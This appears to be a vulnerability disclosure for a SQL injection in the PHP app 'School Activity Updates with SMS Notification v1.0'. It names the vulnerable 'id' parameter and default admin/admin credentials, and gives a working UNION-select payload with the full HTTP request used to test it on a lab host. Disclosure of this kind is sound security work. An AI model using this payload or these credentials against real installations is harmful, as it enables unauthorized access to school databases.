# School Activity Updates with SMS Notification v1.0 by janobe has SQL injection

BUG_Author: z1pwn

Login account: admin/admin (Super Admin account)

vendors: https://www.sourcecodester.com/php/13799/school-activity-updates-sms-notification-phppdo.html

The program is built using the xmapp-php5.6 version

Vulnerability File: /activity/admin/modules/announcement/index.php?view=edit&id=

Vulnerability location: /activity/admin/modules/announcement/index.php?view=edit&id=, id

dbname =db_wvsu

[+] Payload: /activity/admin/modules/announcement/index.php?view=edit&id=-201900050%27%20union%20select%201,database(),3,4,5,6--+ // Leak place ---> id

```sql
GET /activity/admin/modules/announcement/index.php?view=edit&id=-201900050%27%20union%20select%201,database(),3,4,5,6--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=a58hbbkeelngug4ek0dssb0rb5
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/183559590-1a6fd71b-79d2-4a3c-a6a5-34419167cf27.png)
